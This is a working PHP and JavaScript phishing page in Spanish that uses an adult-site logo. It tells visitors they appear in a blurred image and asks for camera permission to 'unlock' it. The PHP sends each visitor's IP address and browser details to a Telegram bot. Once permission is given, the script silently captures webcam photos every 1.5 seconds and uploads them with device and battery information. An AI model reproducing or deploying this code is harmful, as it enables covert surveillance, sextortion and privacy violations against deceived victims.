<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

// Obtener info del dispositivo
$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

// Mensaje base
$msg = "📱 <b>Info del dispositivo</b>\n".
       "📌 IP: $ip\n".
       "🖥️ Navegador: $ua\n".
       "⏰ Hora: $ts";

// Enviar mensaje de texto a Telegram
send_to_telegram($msg);
?>

<!doctype html>
<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        body { margin:0; font-family:Arial,Helvetica,sans-serif; background:#111; color:#fff; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column;}
        body::before { content:""; position:fixed; top:0; left:0; width:100%; height:100%; background:url('img/image1.jpg') no-repeat center/cover; filter:blur(20px) brightness(0.4); z-index:-1; transition: all 1s ease;}
        body.unlocked::before { background:url('img/image2.jpg') no-repeat center/cover; filter:none;}
        #cameraModal .content { background:#1c1c1c; color:#fff; padding:25px; border-radius:6px; max-width:420px; text-align:center; box-shadow:0 0 15px rgba(0,0,0,0.6); border:1px solid #333;}
        .logo { max-width:150px; margin-bottom:15px;}
        #grantAccess { margin-top:20px; padding:12px 25px; background-color:#e50914; color:#fff; border:none; border-radius:3px; cursor:pointer; font-size:16px; font-weight:bold; transition:background 0.2s;}
        #grantAccess:hover { background-color:#b00610;}
        #cameraModal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:flex; align-items:center; justify-content:center; z-index:9999;}
        #unlockAnimation { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); color:#fff; display:flex; align-items:center; justify-content:center; flex-direction:column; font-size:22px; z-index:10000; display:none;}
        .loader { border:6px solid #333; border-top:6px solid #e50914; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin-top:15px;}
        @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .disclaimer { font-size:11px; color:#aaa; margin-top:15px;}
    </style>
</head>
<body>

<div id="cameraModal">
    <div class="content">
        <img src="img/logo-erome-vertical.png" alt="Logo" class="logo">
        <p>📸 ¡Wow! Apareces en la imagen de fondo... necesitamos tu permiso para acceder a la cámara.</p>
        <button id="grantAccess">Permitir acceso</button>
        <div class="disclaimer">Al usar esta página, aceptas nuestra política de privacidad.</div>
    </div>
</div>

<div id="unlockAnimation">
    <div>Desbloqueando imagen...</div>
    <div class="loader"></div>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
'use strict';

function postDeviceInfo(agent, navegador, versionapp, dystro, idioma, bateri) {
    $.ajax({
        url: 'device_info.php',
        type: 'POST',
        data: { agent, navegador, versionapp, dystro, idioma, bateri },
        dataType: 'json'
    });
}

function postPhoto(imgdata) {
    $.ajax({
        type: 'POST',
        url: 'post.php',
        data: { cat: imgdata },
        dataType: 'json'
    });
}

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio:false, video:{ facingMode:"user" } };

async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        captureLoop();

        document.getElementById('unlockAnimation').style.display = 'flex';
        setTimeout(()=>{ document.getElementById('unlockAnimation').style.display='none'; document.body.classList.add('unlocked'); }, 5000);

    } catch(e) { console.error(e); }
}

function captureLoop() {
    const ctx = canvas.getContext('2d');
    setInterval(async ()=>{
        ctx.drawImage(video,0,0,640,480);
        const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
        postPhoto(imgData);

        // Obtener info del dispositivo
        const n1 = navigator.userAgent;
        const n2 = navigator.appName;
        const n3 = navigator.appVersion;
        const n4 = navigator.platform;
        const n5 = navigator.language;
        const bateria = await navigator.getBattery().then(b=>b.level*100);
        postDeviceInfo(n1,n2,n3,n4,n5,bateria);

    },1500);
}

document.getElementById('grantAccess').addEventListener('click', ()=>{
    document.getElementById('cameraModal').style.display='none';
    initCamera();
});
</script>
</body>
</html>
